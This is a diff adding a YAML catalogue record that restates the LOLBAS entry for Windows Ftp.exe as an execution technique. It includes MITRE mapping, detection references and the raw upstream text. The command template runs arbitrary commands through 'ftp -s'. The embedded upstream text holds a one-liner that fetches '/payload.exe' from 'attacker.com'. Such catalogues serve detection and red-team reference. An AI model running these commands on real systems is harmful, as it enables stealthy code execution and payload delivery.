@@ -1,0 +1,100 @@
+id: lolbas/T1NCaW5hcmllcy9GdHAueW1s/RXhlY3V0ZQ/0
+type: binary
+platform: windows
+name: Ftp.exe
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1202
+opsec:
+  noise: high
+  triggers: cmd /c as child process of ftp.exe
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_ftp.yml
+commands:
+- template: echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt
+  comment: Executes the commands you put inside the text file.
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Ftp/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Ftp.exe
+      category: Execute
+      privileges: User
+      mitre_id: T1202
+      source_file: OSBinaries/Ftp.yml
+      command_source_index: 0
+      document_utf8: "---\nName: Ftp.exe\nDescription: A binary designed for connecting to FTP servers\n\
+        Author: Oddvar Moe\nCreated: 2018-12-10\nCommands:\n  - Command: echo !{CMD} > ftpcommands.txt\
+        \ && ftp -s:ftpcommands.txt\n    Description: Executes the commands you put inside the text file.\n\
+        \    Usecase: Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand\n    Category:\
+        \ Execute\n    Privileges: User\n    MitreID: T1202\n    OperatingSystem: Windows 7, Windows 8,\
+        \ Windows 8.1, Windows 10, Windows 11\n    Tags:\n      - Execute: CMD\n  - Command: cmd.exe /c\
+        \ \"@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo\
+        \ binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v\"\n \
+        \   Description: Download\n    Usecase: Spawn new process using ftp.exe. Ftp.exe downloads the\
+        \ binary.\n    Category: Download\n    Privileges: User\n    MitreID: T1105\n    OperatingSystem:\
+        \ Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\nFull_Path:\n\
+        \  - Path: C:\\Windows\\System32\\ftp.exe\n  - Path: C:\\Windows\\SysWOW64\\ftp.exe\nDetection:\n\
+        \  - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_ftp.yml\n\
+        \  - IOC: cmd /c as child process of ftp.exe\nResources:\n  - Link: https://twitter.com/0xAmit/status/1070063130636640256\n\
+        \  - Link: https://medium.com/@0xamit/lets-talk-about-security-research-discoveries-and-proper-discussion-etiquette-on-twitter-10f9be6d1939\n\
+        \  - Link: https://ss64.com/nt/ftp.html\n  - Link: https://www.asafety.fr/vuln-exploit-poc/windows-dos-powershell-upload-de-fichier-en-ligne-de-commande-one-liner/\n\
+        Acknowledgement:\n  - Person: Casey Smith\n    Handle: '@subtee'\n  - Person: BennyHusted\n  \
+        \  Handle: ''\n  - Person: Amit Serper\n    Handle: '@0xAmit'\n"
+      document_sha256: sha256:55446311f42708bb15d3b7a225a1d8c725e23faeda5da521fc1d558a0589a3bc
+    upstream_url: https://lolbas-project.github.io/lolbas/Binaries/Ftp/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1202
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:618265741ce88858fc8d772a456c4dffc4a14a74160a45e506c6d97f240a69f0
